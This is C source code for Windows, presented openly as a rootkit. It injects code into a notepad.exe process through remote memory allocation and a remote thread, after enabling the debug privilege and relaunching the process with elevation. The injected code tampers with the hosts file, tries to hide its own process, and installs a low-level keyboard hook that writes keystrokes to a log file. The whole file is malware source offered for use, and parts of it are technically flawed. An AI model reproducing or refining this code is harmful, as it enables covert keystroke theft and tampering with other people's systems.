#define PSAPI_VERSION 1
#define WINVER 0x0600
#define GetThreadId(h) ((DWORD) _getthreadid(h))

#include <Windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

// Global variable for the keylogging file
HANDLE hLogFile;

// Function to retrieve the process ID (PID) of the target process by name
DWORD GetTargetProcessID(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create snapshot of processes. Error: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        printf("Failed to get the first process entry. Error: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// Function to hide the rootkit process from the process list
void HideRootkitProcess(HANDLE hProcess) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create snapshot of processes. Error: %lu\n", GetLastError());
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        printf("Failed to get the first process entry. Error: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (GetProcessImageFileName(hProcess, pe32.szExeFile, MAX_PATH) == 0) {
            printf("Failed to get process image file name. Error: %lu\n", GetLastError());
            CloseHandle(hSnapshot);
            return;
        }

        if (strcmp(pe32.szExeFile, "rootkit.exe") == 0) {
            // Hide the rootkit process
            HANDLE hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcessHandle == NULL) {
                printf("Failed to open rootkit process. Error: %lu\n", GetLastError());
                CloseHandle(hSnapshot);
                return;
            }

            if (!SetProcessWorkingSetSize(hProcessHandle, (SIZE_T)-1, (SIZE_T)-1)) {
                printf("Failed to hide rootkit process. Error: %lu\n", GetLastError());
                CloseHandle(hProcessHandle);
                CloseHandle(hSnapshot);
                return;
            }

            CloseHandle(hProcessHandle);
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
}

// Function to perform file tampering
void PerformFileTampering() {
    // Open the file to tamper with
    HANDLE hFile = CreateFile("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file. Error: %lu\n", GetLastError());
        return;
    }

    // Move the file pointer to the end
    SetFilePointer(hFile, 0, NULL, FILE_END);

    // Tamper with the file contents
    char *tamperedContents = "\n127.0.0.1 www.google.com\n";
    DWORD bytesWritten;
    if (!WriteFile(hFile, tamperedContents, strlen(tamperedContents), &bytesWritten, NULL)) {
        printf("Failed to write to file. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return;
    }

    // Close the file handle
    CloseHandle(hFile);
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyInfo = (KBDLLHOOKSTRUCT *)lParam;
        char keyChar = MapVirtualKey(pKeyInfo->vkCode, MAPVK_VK_TO_CHAR);
        DWORD bytesWritten;
        WriteFile(hLogFile, &keyChar, 1, &bytesWritten, NULL);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to perform keylogging
void PerformKeylogging() {
    // Create a file to store the logged keys
    hLogFile = CreateFile("C:\\Windows\\System32\\drivers\\etc\\keylog.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLogFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create log file. Error: %lu\n", GetLastError());
        return;
    }

    // Set up the keyboard hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to set up keyboard hook. Error: %lu\n", GetLastError());
        CloseHandle(hLogFile);
        return;
    }

    // Wait for the hook to process messages
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hHook);

    // Close the log file handle
    CloseHandle(hLogFile);
}
// Mark the start of the rootkit code
#pragma section(".text", read, execute)
void RootkitCodeStart() {}
// Rootkit code to be executed in the remote process
DWORD WINAPI RootkitCode(LPVOID lpParameter) {
    // Hide the rootkit process from the process list
    HideRootkitProcess(GetCurrentProcess());

    // Perform file tampering
    PerformFileTampering();

    // Perform keylogging
    PerformKeylogging();

    // Display a message to show successful injection
    MessageBox(NULL, "Injected into process", "Rootkit", MB_OK);

    return 0;
}
// Mark the end of the rootkit code
#pragma section(".text", read, execute)
void RootkitCodeEnd() {}
// Function to calculate the size of the rootkit code
SIZE_T CalculateCodeSize() {
    return (SIZE_T)(&RootkitCodeEnd - &RootkitCodeStart);
}


/* DWORD RootkitCodeStart = (DWORD)RootkitCode;
DWORD RootkitCodeEnd = (DWORD)RootkitCode + 0x1000; */ // Adjust the size as needed */

// Function to create a memory-resident rootkit in the remote process
HANDLE CreateMemoryResidentRootkit(HANDLE hProcess) {
    SIZE_T codeSize = CalculateCodeSize();

    // Allocate memory in the target process for the rootkit code
    LPVOID pRootkitMemory = VirtualAllocEx(hProcess, NULL, codeSize, MEM_COMMIT, PAGE_READWRITE);
    if (pRootkitMemory == NULL) {
        printf ("Failed to allocate memory in target process. Error: %lu\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    // Change the protection of the allocated memory to PAGE_EXECUTE_READWRITE
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, pRootkitMemory, codeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change protection of allocated memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRootkitMemory, 0, MEM_RELEASE);
        return INVALID_HANDLE_VALUE;
    }

    // Write the rootkit code into the allocated memory
    if (!WriteProcessMemory(hProcess, pRootkitMemory, (LPCVOID)RootkitCode, codeSize, NULL)) {
        printf("Failed to write rootkit code to target process. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRootkitMemory, 0, MEM_RELEASE);
        return INVALID_HANDLE_VALUE;
    }

    // Create a remote thread to execute the rootkit code in the target process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRootkitMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRootkitMemory, 0, MEM_RELEASE);
        return INVALID_HANDLE_VALUE;
    }

    // Wait for the remote thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up handles and memory
    VirtualFreeEx(hProcess, pRootkitMemory, 0, MEM_RELEASE);

    return hThread;
}

int main() {
    const char *targetProcess = "notepad.exe";  // Replace with your target process name
    DWORD targetPID = GetTargetProcessID(targetProcess);
    if (targetPID == 0) {
        printf("Target process not found.\n");
        return 1;
    }

    // Launch the target process with elevated privileges
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas";
    sei.lpFile = targetProcess;
    sei.nShow = SW_SHOW;
    if (!ShellExecuteEx(&sei)) {
        printf("Failed to launch target process with elevated privileges.\n");
        return 1;
    }

    // Wait for the target process to start
    HANDLE hProcess = sei.hProcess;
    WaitForInputIdle(hProcess, INFINITE);

    // Get the process ID of the elevated target process
    targetPID = GetProcessId(hProcess);

    // Enable the SE_DEBUG_NAME privilege to access token information
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("Failed to open process token\n");
        return 1;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("Failed to lookup privilege value\n");
        CloseHandle(hToken);
        return 1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("Failed to adjust token privileges\n");
        CloseHandle(hToken);
        return 1;
    }

    CloseHandle(hToken);

    // Open the target process
    HANDLE hProcess2 = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_CREATE_THREAD, FALSE, targetPID);
    if (hProcess2 == NULL) {
        printf("Failed to open target process. Error: %lu\n", GetLastError());
        return 1;
    }

    // Check if the target process is running under a different user account
    HANDLE hToken2;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);
    TOKEN_ELEVATION te;
    if (!OpenProcessToken(hProcess2, TOKEN_QUERY, &hToken2)) {
        printf("Failed to open process token\n");
        CloseHandle(hProcess2);
        return 1;
    }

    if (!GetTokenInformation(hToken2, TokenElevation, &te, dwSize, &dwSize)) {
        printf("Failed to get token information\n");
        CloseHandle(hToken2);
        CloseHandle(hProcess2);
        return 1;
    }

    CloseHandle(hToken2);

    if (te.TokenIsElevated) {
        printf("Target process is running with elevated privileges\n");
    } else {
        printf("Target process is not running with elevated privileges\n");
    }

    // Check the target process's integrity level
    HANDLE hToken3;
    TOKEN_MANDATORY_LABEL tml;
    dwSize = sizeof(TOKEN_MANDATORY_LABEL);
    if (!OpenProcessToken(hProcess2, TOKEN_QUERY, &hToken3)) {
        printf("Failed to open process token\n");
        CloseHandle(hProcess2);
        return 1;
    }

    if (!GetTokenInformation(hToken3, TokenIntegrityLevel, &tml, dwSize, &dwSize)) {
        printf("Failed to get token information\n");
        CloseHandle(hToken3);
        CloseHandle(hProcess2);
        return 1;
    }

    CloseHandle(hToken3);

    // Check if the target process's integrity level is higher than the current process's integrity level
    HANDLE hCurrentToken;
    TOKEN_MANDATORY_LABEL tmlCurrent;
    dwSize = sizeof(TOKEN_MANDATORY_LABEL);
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentToken)) {
        printf("Failed to open process token\n");
        CloseHandle(hProcess2);
        return 1;
    }

    if (!GetTokenInformation(hCurrentToken, TokenIntegrityLevel, &tmlCurrent, dwSize, &dwSize)) {
        printf("Failed to get token information\n");
        CloseHandle(hCurrentToken);
        CloseHandle(hProcess2);
        return 1;
    }

    CloseHandle(hCurrentToken);

    SID *sid = tml.Label.Sid;
    SID *sidCurrent = tmlCurrent.Label.Sid;

    if (sid->SubAuthority[0] > sidCurrent->SubAuthority[0]) {
        printf("Target process's integrity level is higher than the current process's integrity level\n");
    } else {
        printf("Target process's integrity level is not higher than the current process's integrity level\n");
    }

    // Create a memory-resident rootkit in the remote process
    HANDLE hRootkitThread = CreateMemoryResidentRootkit(hProcess2);
    if (hRootkitThread == INVALID_HANDLE_VALUE) {
        printf("Failed to create memory-resident rootkit.\n");
        CloseHandle(hProcess2);
        return 1;
    }

    // Wait for the rootkit thread to complete execution
    WaitForSingleObject(hRootkitThread, INFINITE);

    // Close handles
    CloseHandle(hRootkitThread);
    CloseHandle(hProcess2);
    CloseHandle(hProcess);

    return 0;
}